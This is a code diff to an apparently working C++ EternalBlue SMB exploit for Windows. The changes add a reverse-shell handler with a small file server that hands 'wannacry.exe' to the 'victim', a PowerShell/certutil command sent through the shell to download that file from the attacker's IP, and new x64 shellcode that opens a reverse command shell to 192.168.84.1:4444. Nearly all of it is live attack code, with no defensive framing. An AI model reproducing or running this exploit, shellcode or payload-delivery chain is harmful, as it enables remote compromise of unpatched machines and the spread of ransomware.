@@ -11,9 +11,53 @@
 #include <algorithm>
 #include <iomanip>
 #include <sstream>
+#include <thread>
+#include <fstream>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
+
+std::string GetLocalIPAddress() {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return "127.0.0.1"; // Fallback to localhost
+    }
+
+    char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
+        WSACleanup();
+        return "127.0.0.1";
+    }
+
+    struct addrinfo hints = {0}, *result = nullptr;
+    hints.ai_family = AF_INET; // IPv4
+    hints.ai_socktype = SOCK_STREAM;
+
+    if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) {
+        WSACleanup();
+        return "127.0.0.1";
+    }
+
+    std::string ip;
+    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
+        if (ptr->ai_family == AF_INET) {
+            char ip_str[INET_ADDRSTRLEN];
+            struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)ptr->ai_addr;
+            inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
+            
+            if (strcmp(ip_str, "127.0.0.1") != 0) {
+                ip = ip_str;
+                break;
+            }
+        }
+    }
+
+    freeaddrinfo(result);
+    WSACleanup();
+    
+    return "192.168.84.1"; //For VM testing purpose (VM card)
+    return ip.empty() ? "127.0.0.1" : ip;
+}
 
 std::string bytes_to_hex(const unsigned char* data, size_t len) {
     std::stringstream ss;
@@ -301,146 +345,141 @@ private:
 class ReverseShellHandler {
 private:
     SOCKET listener;
-    int port;
-    
+    int shellPort = 4444;
+    int filePort = 4445;
+    std::string IP;
+    std::string filename = "wannacry.exe"; 
+
 public:
-    ReverseShellHandler(int listenPort = 4444) : port(listenPort), listener(INVALID_SOCKET) {}
-    
+    ReverseShellHandler() : listener(INVALID_SOCKET) {}
+
+    void MiniHttpServer() {
+        SOCKET serverSock, clientSock;
+        struct sockaddr_in serverAddr, clientAddr;
+        int len = sizeof(clientAddr);
+
+        serverSock = socket(AF_INET, SOCK_STREAM, 0);
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_addr.s_addr = INADDR_ANY;
+        serverAddr.sin_port = htons(filePort);
+
+        bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
+        listen(serverSock, 1);
+
+        while (true) {
+            clientSock = accept(serverSock, (struct sockaddr*)&clientAddr, &len);
+            if (clientSock != INVALID_SOCKET) {
+                char buf[1024]; recv(clientSock, buf, 1024, 0);
+
+                std::ifstream f(filename, std::ios::binary);
+                if (f) {
+                    std::ostringstream ss; ss << f.rdbuf();
+                    std::string content = ss.str();
+                    
+                    std::string response = 
+                        "HTTP/1.1 200 OK\r\n"
+                        "Content-Type: application/octet-stream\r\n"
+                        "Content-Length: " + std::to_string(content.size()) + "\r\n"
+                        "\r\n" + content;
+
+                    send(clientSock, response.c_str(), response.length(), 0);
+                    std::cout << "\n[FileServer] Sent file '" << filename << "' (" << content.size() << " bytes) to victim.\n";
+                }
+                closesocket(clientSock);
+                closesocket(serverSock);
+                break; 
+            }
+        }
+    }
+
     bool StartListener() {
         WSADATA wsa;
-        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-            std::cout << "[-] WSAStartup failed: " << WSAGetLastError() << std::endl;
-            return false;
-        }
+        WSAStartup(MAKEWORD(2, 2), &wsa);
         
         listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (listener == INVALID_SOCKET) {
-            std::cout << "[-] Socket creation failed: " << WSAGetLastError() << std::endl;
-            return false;
-        }
-        
-        int yes = 1;
-        if (setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes)) == SOCKET_ERROR) {
-            std::cout << "[-] setsockopt failed: " << WSAGetLastError() << std::endl;
-        }
-        
         sockaddr_in server;
         server.sin_family = AF_INET;
         server.sin_addr.s_addr = INADDR_ANY;
-        server.sin_port = htons(port);
+        server.sin_port = htons(shellPort);
         
-        if (bind(listener, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
-            std::cout << "[-] Bind failed: " << WSAGetLastError() << std::endl;
-            closesocket(listener);
-            return false;
-        }
+        if (bind(listener, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) return false;
+        listen(listener, 1);
         
-        std::cout << "[*] Listening on port " << port << "..." << std::endl;
-        if (listen(listener, 1) == SOCKET_ERROR) {
-            std::cout << "[-] Listen failed: " << WSAGetLastError() << std::endl;
-            closesocket(listener);
-            return false;
-        }
-        
-        std::cout << "[+] Reverse shell handler listening on port " << port << std::endl;
+        std::cout << "[*] Shell listening on " << shellPort << " | File Server will be on " << filePort << std::endl;
         return true;
     }
-    
-    bool WaitForConnection() {
-        if (listener == INVALID_SOCKET) {
-            std::cout << "[-] Listener not initialized" << std::endl;
-            return false;
-        }
-        
-        std::cout << "[*] Waiting for reverse shell connection..." << std::endl;
-        
+
+    bool WaitForConnection(int seconds, SOCKET &clientSocket) {
         fd_set readfds;
         FD_ZERO(&readfds);
         FD_SET(listener, &readfds);
-        
-        timeval timeout{15, 0}; 
-        
-        int result = select(0, &readfds, NULL, NULL, &timeout);
+
+        struct timeval tv;
+        tv.tv_sec = seconds;
+        tv.tv_usec = 0;
+
+        std::cout << "[Network] Waiting for incoming connection (" << seconds << "s timeout)..." << std::endl;
+
+        int result = select(0, &readfds, NULL, NULL, &tv);
+
         if (result > 0) {
-            SOCKET client = accept(listener, NULL, NULL);
-            if (client != INVALID_SOCKET) {
-                std::cout << "[+] Reverse shell connection received!" << std::endl;
-                HandleShell(client);
-                closesocket(client);
-                return true;
+            clientSocket = accept(listener, NULL, NULL);
+            if (clientSocket != INVALID_SOCKET) {
+                HandleShell(clientSocket);
+                return true; 
             }
         } else if (result == 0) {
-            std::cout << "[-] Timeout waiting for reverse shell" << std::endl;
+            std::cout << "[Network] Connection timed out." << std::endl;
         } else {
-            std::cout << "[-] Select failed: " << WSAGetLastError() << std::endl;
+            std::cout << "[Network] Select error: " << WSAGetLastError() << std::endl;
         }
-        
+
         return false;
     }
-    
+
 private:
     void HandleShell(SOCKET client) {
-        std::cout << "[+] Handling reverse shell session..." << std::endl;
+        IP = GetLocalIPAddress(); 
         
-        char buffer[4096];
-        int received;
-        
-        u_long mode = 0;
-        ioctlsocket(client, FIONBIO, &mode);
-        
-        DWORD timeout = 5000;
-        setsockopt(client, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+        std::thread fileThread(&ReverseShellHandler::MiniHttpServer, this);
+        fileThread.detach();
 
         ExecuteCopyAndRunCommands(client);
-        
-        auto start = std::chrono::steady_clock::now();
-        while (std::chrono::steady_clock::now() - start < std::chrono::seconds(10)) {
-            received = recv(client, buffer, sizeof(buffer) - 1, 0);
-            if (received > 0) {
-                buffer[received] = '\0';
-                std::cout << "[Shell] " << buffer;
-            } else if (received == 0) {
-                std::cout << "[+] Shell disconnected" << std::endl;
-                break;
-            }
-            
-            Sleep(500);
+
+        char buffer[4096];
+        while (true) {
+            int received = recv(client, buffer, sizeof(buffer) - 1, 0);
+            if (received <= 0) break;
+            buffer[received] = '\0';
+            std::cout << buffer;
         }
-        
-        std::cout << "[+] Shell session ended" << std::endl;
     }
 
     void ExecuteCopyAndRunCommands(SOCKET client) {
-        char currentPath[MAX_PATH];
-        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
-        std::string currentFile = currentPath;
+        std::cout << "[+] Sending payload download command..." << std::endl;
+
+        std::string command = "cd /d C:\\Windows\\Temp\n";
+        send(client, command.c_str(), command.length(), 0);
+
+        std::string ps_cmd = "powershell -exec bypass -c \"";
+        ps_cmd += "try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {};";
+        ps_cmd += "$url='" + std::string("http://") + IP + ":" + std::to_string(filePort) + "/" + filename + "';";
+        ps_cmd += "$output='" + filename + "';";
+        ps_cmd += "try {";
+        ps_cmd += "  (New-Object System.Net.WebClient).DownloadFile($url, $output);";
+        ps_cmd += "  echo '[+] Download WebClient OK';";
+        ps_cmd += "} catch {";
+        ps_cmd += "  echo '[-] WebClient failed, using certutil...';";
+        ps_cmd += "  certutil -urlcache -split -f $url $output;";
+        ps_cmd += "}\"";
+
+        std::string fullCommand = ps_cmd + "\n";
+        send(client, fullCommand.c_str(), fullCommand.length(), 0);
         
-        std::vector<std::string> commands = {
-            "ls"
-        };
-        
-        for (const auto& cmd : commands) {
-            std::string fullCommand = cmd + "\n"; 
-            int sent = send(client, fullCommand.c_str(), fullCommand.length(), 0);
-            std::cout << "[>>] Sent: " << cmd << " (" << sent << " bytes)" << std::endl;
-            
-            Sleep(150000);
-            char buffer[4096];
-            int received = recv(client, buffer, sizeof(buffer)-1, 0);
-            
-            if (received > 0) {
-                buffer[received] = '\0';
-                std::cout << "[SUCCESS] Response (" << received << " bytes):\n" << buffer << std::endl;
-            } else if (received == 0) {
-                std::cout << "[-] Shell disconnected" << std::endl;
-                return;
-            } else {
-                std::cout << "[-] No response for: " << cmd << std::endl;
-            }
-        }
+        // std::string runCmd = ".\\" + filename + "\n";
+        // send(client, runCmd.c_str(), runCmd.length(), 0);
     }
 };
-
 class EternalBlue {
 private:
     std::string targetIP;
@@ -464,7 +503,7 @@ private:
     unsigned char echoRequest[53];
     unsigned char userID[2] = {0, 0};       
     unsigned char treeID[2] = {0, 0};  
-    unsigned char payload[511];
+    unsigned char payload[460];
 
     std::vector<SOCKET> groomSockets;
 
@@ -473,6 +512,7 @@ private:
 public:
     EternalBlue() {
         InitializePackets();
+        localIP = GetLocalIPAddress();
     }
 
      ~EternalBlue() {
@@ -485,8 +525,6 @@ public:
             return false;
         }
         
-        localIP = GetLocalIPAddress();
-        localIP = "192.168.84.1"; // IP VM card
         targetIP = host;
         std::cout << "[*] Local IP: " << localIP << std::endl;
         std::cout << "[*] Target: " << host << "\n\n";
@@ -586,13 +624,15 @@ public:
                 Send(sock, payload_body_pkt.data() + 2920, 1152);
             }
 
-            bool gotShell = shellHandler.WaitForConnection();
+            SOCKET client;
+            bool gotShell = shellHandler.WaitForConnection(10, client);
         
             if (gotShell) {
                 std::cout << "[+] Exploit successful! Got reverse shell." << std::endl;
-
+                closesocket(sock);
                 return true;
             } 
+            closesocket(sock);
         }
 
         return true;
@@ -624,47 +664,6 @@ private:
         return received;
     }
 
-    std::string GetLocalIPAddress() {
-        WSADATA wsaData;
-        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-            return "127.0.0.1"; // Fallback to localhost
-        }
-
-        char hostname[256];
-        if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
-            WSACleanup();
-            return "127.0.0.1";
-        }
-
-        struct addrinfo hints = {0}, *result = nullptr;
-        hints.ai_family = AF_INET; // IPv4
-        hints.ai_socktype = SOCK_STREAM;
-
-        if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) {
-            WSACleanup();
-            return "127.0.0.1";
-        }
-
-        std::string ip;
-        for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
-            if (ptr->ai_family == AF_INET) {
-                char ip_str[INET_ADDRSTRLEN];
-                struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)ptr->ai_addr;
-                inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
-                
-                if (strcmp(ip_str, "127.0.0.1") != 0) {
-                    ip = ip_str;
-                    break;
-                }
-            }
-        }
-
-        freeaddrinfo(result);
-        WSACleanup();
-        
-        return ip.empty() ? "127.0.0.1" : ip;
-    }
-
     uint32_t generate_process_hash() {
         std::string proc_str = processName;
         proc_str.push_back('\0');
@@ -679,7 +678,7 @@ private:
 
     std::vector<uint8_t> make_kernel_user_payload() {
         std::vector<uint8_t> sc;
-        std::vector<uint8_t> ring3(payload, payload + 511);  
+        std::vector<uint8_t> ring3(payload, payload + 460);  
         size_t ring3_size = sizeof(payload);
         uint32_t proc_hash = generate_process_hash();
         uint16_t len = static_cast<uint16_t>(ring3_size);
@@ -687,10 +686,10 @@ private:
         unsigned int ip_bytes[4];
         if (sscanf(localIP.c_str(), "%u.%u.%u.%u", &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) != 4) return sc;
     
-        ring3[246] = static_cast<uint8_t>(ip_bytes[0]);
-        ring3[247] = static_cast<uint8_t>(ip_bytes[1]);
-        ring3[248] = static_cast<uint8_t>(ip_bytes[2]);
-        ring3[249] = static_cast<uint8_t>(ip_bytes[3]);
+        ring3[234] = static_cast<uint8_t>(ip_bytes[0]);
+        ring3[235] = static_cast<uint8_t>(ip_bytes[1]);
+        ring3[236] = static_cast<uint8_t>(ip_bytes[2]);
+        ring3[237] = static_cast<uint8_t>(ip_bytes[3]);
 
         unsigned char kernel_sc[] = {
             0x55, 0xe8, 0x2e, 0x00, 0x00, 0x00, 0xb9, 0x82, 0x00, 0x00, 0xc0, 0x0f, 0x32, 0x4c, 0x8d,
@@ -924,49 +923,37 @@ private:
         memcpy(echoRequest, echo, sizeof(echo));
         
         unsigned char kernel_payload[] = {
-            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
-            0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
-            0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
-            0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
-            0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
-            0x01, 0xc1, 0xe2, 0xed, 0x52, 0x48, 0x8b, 0x52, 0x20, 0x41, 0x51, 0x8b,
-            0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f,
-            0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
-            0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x50,
-            0x49, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x4d,
-            0x31, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0,
-            0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
-            0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
-            0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
-            0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
-            0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
-            0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
-            0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49,
-            0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
-            0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
-            0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x54, 0x8a, 0x41, 0x54,
-            0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
-            0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
-            0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50,
-            0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
-            0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf,
-            0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89,
-            0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
-            0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00,
-            0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9,
-            0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8,
-            0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20,
-            0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00,
-            0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4,
-            0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31,
-            0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba,
-            0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58,
-            0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00,
-            0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41,
-            0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c,
-            0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6,
-            0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d,
-            0x2a, 0x0a, 0x41, 0x89, 0xda, 0xff, 0xd5
+            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 
+            0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
+            0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 
+            0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 
+            0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 
+            0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
+            0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 
+            0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
+            0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 
+            0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
+            0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 
+            0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 
+            0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 
+            0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 
+            0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 
+            0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x54, 0x01, 0x41, 0x54, 
+            0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 
+            0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 
+            0xd5, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 
+            0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 
+            0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 
+            0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48, 0x81, 0xc4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xb8, 0x63, 
+            0x6d, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 
+            0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a, 0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 
+            0x24, 0x54, 0x01, 0x01, 0x48, 0x8d, 0x44, 0x24, 0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 
+            0x56, 0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 
+            0xc8, 0x4d, 0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 0xff, 0xd5, 
+            0x48, 0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 0x87, 0x1d, 0x60, 0xff, 
+            0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 
+            0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 
+            0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5
         };
         memcpy(payload, kernel_payload, sizeof(kernel_payload));
     }
